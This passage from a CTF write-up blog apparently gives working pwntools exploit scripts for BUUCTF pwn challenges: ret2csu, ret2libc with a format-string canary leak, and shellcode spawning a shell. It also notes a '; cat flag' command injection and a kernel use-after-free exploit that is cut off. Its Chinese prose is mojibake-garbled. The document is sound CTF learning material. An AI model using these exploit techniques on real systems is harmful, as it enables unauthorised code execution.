class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>rl()<br>payload = asm(shellcraft.sh())<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h1><p>ROPï¼Œåªå¼€äº†NXä¿æŠ¤ã€‚ç”±äºè¦è°ƒç”¨<code>write</code>ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°<code>pop rdx</code>çš„gadgetï¼Œåªèƒ½<code>ret2csu</code>æ¥è®¾ç½®å‚æ•°äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25180&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#  b *vulnerable_function+5</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_6_ret = <span class="hljs-number">0x04006AA</span><br>pop_rdi = <span class="hljs-number">0x4006b3</span><br>arg_set = <span class="hljs-number">0x400690</span><br>main = <span class="hljs-number">0x40061A</span><br>ru(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_6_ret)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(write_got)<br>payload += p64(<span class="hljs-number">8</span>)<br>payload += p64(write_got)<br>payload += p64(<span class="hljs-number">1</span>)<br>payload += p64(arg_set)<br>payload += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br>payload += p64(main)<br>sl(payload)<br><br>write = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>obj = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;write_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(write)&#125;</span>&quot;</span>)<br>libc = write - obj.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>payload = <span class="hljs-number">0x88</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(pop_rdi) + p64(bin_sh) + p64(system)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>ä¿æŠ¤æƒ…å†µå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰æ˜æ˜¾çš„åé—¨å‡½æ•°ï¼Œå­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºã€‚ç›®å‰æ€è·¯ï¼šå…ˆæ³„éœ²canaryï¼Œç„¶åé€šè¿‡<code>puts</code>æ³„éœ²<code>libc</code>åŸºå€ï¼Œç„¶åè°ƒ<code>system(&#39;/bin/sh&#39;)</code>ã€‚<br>giftå‡½æ•°åªæ¥æ”¶6ä¸ªå­—ç¬¦ï¼Œæ— æ³•æ³„éœ²canaryï¼Œvulnä¸­çš„readåæ²¡æœ‰putsï¼Œä¹Ÿæ— æ³•æ³„éœ²canary()ï¼Œå¡ä½äº†</p><p>ä¸å¯¹ï¼Œgiftå‡½æ•°ä¸­scanfè¯»å…¥äº†formatä¹‹åï¼Œæœ‰ç›´æ¥æ‰“å°formatï¼Œè¿™é‡Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯æˆ‘çš„è–„å¼±é¡¹ovoï¼‰ã€‚</p><p>æ³„éœ²äº†canaryä¹‹åç›´æ¥ret2libcå°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:29582&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x400993</span><br>vuln = <span class="hljs-number">0x4008B1</span><br>main = <span class="hljs-number">0x4008DA</span><br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     b *vuln+55</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>ru(<span class="hljs-string">b&#x27;u!\n&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;canary&#125;</span>&quot;</span>)<br>ru(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload)<br>put = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;put_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(put)&#125;</span>&quot;</span>)<br><br>obj = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, put)<br>libc = put - obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;libc: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;system: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># libc_base = put - libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment"># bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><br>rl()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system) + p64(vuln)<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿œç¨‹æ²¡æ‰“é€šï¼Œå¹¶ä¸”æ‰¾ä¸åˆ°åŸå› ã€‚å…ˆä¸ç®¡äº†ï¼Œä¹‹åå†çœ‹ã€‚<br>æ‰¾åˆ°é—®é¢˜äº†ï¼Œæ­£ç¡®çš„wpå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27694&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x400993</span><br>vuln = <span class="hljs-number">0x400887</span><br>main = <span class="hljs-number">0x4008DA</span><br>ret = <span class="hljs-number">0x4008D9</span><br><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#     b *vuln+55</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br><br>ru(<span class="hljs-string">b&#x27;u!\n&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;canary: <span class="hljs-subst">&#123;canary&#125;</span>&quot;</span>)<br>ru(<span class="hljs-string">b&#x27;story!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)<br>sl(payload)<br>put = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;put_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(put)&#125;</span>&quot;</span>)<br><br>obj = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, put)<br>libc_base = put - obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system = libc_base + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc_base + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br><span class="hljs-comment"># libc_base = put - libc.sym[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment"># bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;libc: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;system: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(system)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br>rl()<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span> - <span class="hljs-number">0x8</span>) + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) + p64(vuln)<br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªé”™è¯¯ï¼ˆbushi</p><ol><li>è¿”å›åœ°å€vulnæé”™äº†ï¼Œåº”è¯¥æ˜¯å¤åˆ¶çš„æ—¶å€™æ²¡æ³¨æ„</li><li>è°ƒç”¨å‡½æ•°éœ€è¦æ ˆ16å­—èŠ‚å¯¹é½ã€‚å› æ­¤éœ€è¦ä¸€ä¸ª<code>ret</code>ä½¿å¾—æ ˆå¯¹é½</li></ol><h1 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h1><p>æ„Ÿè§‰æ˜¯ä¸ª ** é¢˜ç›®ï¼Œç›´æ¥è¾“å…¥1ï¼Œç„¶å; cat flagå°±è¡Œ</p><h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>å †é¢˜ï¼ˆï¼ï¼ï¼ï¼ç»ˆäºåšåˆ°æœ‰å…³å †çš„é¢˜ç›®äº†ï¼Œå¯ä»¥å¼€å§‹æ–°çš„å­¦ä¹ äº†<br>ç¬¬ä¸€æ­¥æ˜¯å…ˆç®€å•çš„é€†å‘<br>ç»“æœä¸‹å›¾æ‰€ç¤ºï¼š</p><p>ä»Šå¤©æ²¡æœ‰å¤šåšå †&#x2F;æ ˆçš„é¢˜ç›®ï¼Œæ‰“TFC CTFåšåˆ°äº†ä¸€é“kernel pwné¢˜ã€‚</p><p>è®°å½•ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œä¹‹åè¦äº†è§£å…¶ç»†èŠ‚ï¼š</p><ol><li>CPUä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ç»å†çš„å…·ä½“è¿‡ç¨‹</li><li>Linuxä¸‹çš„ç³»ç»Ÿè°ƒç”¨ä»¥<code>eax/rax</code>å¯„å­˜å™¨ä½œä¸º<strong>ç³»ç»Ÿè°ƒç”¨å·</strong>ï¼Œå‚æ•°ä¼ é€’çº¦æŸå¦‚ä¸‹ï¼š</li></ol><ul><li><p>32 ä½ï¼š<code>ebxã€ecxã€edxã€esiã€ediã€ebp</code>Â ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€ç¬¬äºŒä¸ªå‚æ•°â€¦è¿›è¡Œå‚æ•°ä¼ é€’</p></li><li><p>64 ä½ï¼š<code>rdiã€rsiã€rdxã€r10ã€r8ã€r9</code>Â ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€ç¬¬äºŒä¸ªå‚æ•°â€¦è¿›è¡Œå‚æ•°ä¼ é€’</p><p>  å¯¹äº 32 ä½ç³»ç»Ÿè°ƒç”¨è€Œè¨€ï¼ŒLinux å®é™…ä¸Šé€šè¿‡ 0x80 å·è½¯ä¸­æ–­å®ç°ç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬åŠŸèƒ½ï¼Œå³ç”¨æˆ·æ€ç¨‹åºé€šè¿‡Â <code>int 0x80</code>Â æŒ‡ä»¤è§¦å‘ä¸€ä¸ªè½¯ä¸­æ–­é™·å…¥å†…æ ¸é¢˜ï¼Œå¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºä¼šæ ¹æ®ç³»ç»Ÿè°ƒç”¨å·åœ¨ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­è°ƒç”¨å¯¹åº”çš„å¤„ç†</p></li></ul><p>æ¥ç€ä¸Šæ¬¡çš„<code>kernel pwn</code>é¢˜</p><h1 id="TFC-CTF"><a href="#TFC-CTF" class="headerlink" title="TFC CTF"></a>TFC CTF</h1><h3 id="slots"><a href="#slots" class="headerlink" title="slots"></a>slots</h3><p>æŸ¥çœ‹ä¸€ä¸‹<code>/dev</code>ç›®å½•ä¸‹å¤šçš„è®¾å¤‡æ–‡ä»¶ï¼Œåå­—ä¸ºï¼š<code>slot_machine</code>ï¼ŒIDAçœ‹ä¸€ä¸‹å…·ä½“äº¤äº’çš„å‡½æ•°</p><ul><li><code>cmd = 0</code>ï¼Œkmalloc(chunk)ï¼Œä½†æ˜¯æœ€å¤šä¸¤æ¬¡</li><li><code>cmd = 1</code>ï¼Œfree(chunk)ï¼Œ</li><li><code>cmd = 3</code>ï¼Œcopy_from_user</li><li><code>cmd = 1337</code>ï¼Œcopy_to_user</li></ul><p>è¿™é‡Œæœ‰ä¸€äº›åœ¨å†…æ ¸ä¸­ä¸ç”¨æˆ·æ€å‡½æ•°å‘æŒ¥ä½œç”¨ç›¸åŒçš„å‡½æ•°ï¼š</p><p>memcpy() -&gt;Â <strong>copy_from_user()&#x2F;copy_to_user()</strong><br>    - copy_from_user() å®ç°äº†å°†ç”¨æˆ·ç©ºé—´çš„æ•°æ®ä¼ é€åˆ°å†…æ ¸ç©ºé—´<br>    - copy_to_user()<br>malloc() -&gt;Â <strong>kmalloc()</strong>ï¼Œå†…æ ¸æ€çš„å†…å­˜åˆ†é…å‡½æ•°ï¼Œå’Œ malloc() ç›¸ä¼¼ï¼Œä½†ä½¿ç”¨çš„æ˜¯Â <code>slab/slub åˆ†é…å™¨</code><br>free() -&gt;Â <strong>kfree()</strong>ï¼ŒåŒ kmalloc()</p><p><img src="/images/20250902203717.png"><br>è¿™é‡Œ<code>kfree</code>æ‰ä¹‹åå¹¶æ²¡æœ‰å°†æŒ‡é’ˆç½®ç©ºï¼Œæ‰€ä»¥å­˜åœ¨å…¸å‹çš„UAF<br><img src="/images/20250902204516.png"><br>è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œoffsetå¯ä»¥æ˜¯è´Ÿçš„ï¼Œå¯ä»¥ä»å†…æ ¸ä¸­è¯»ä»»æ„å¤§å°çš„sizeåˆ°ç”¨æˆ·æ€å¹¶ä¸”å†™å‡ºæ¥ã€‚è¿™å°±å¯ä»¥ç›´æ¥ä»chunkåœ°å€ä¸­è¯»flagäº†ã€‚</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 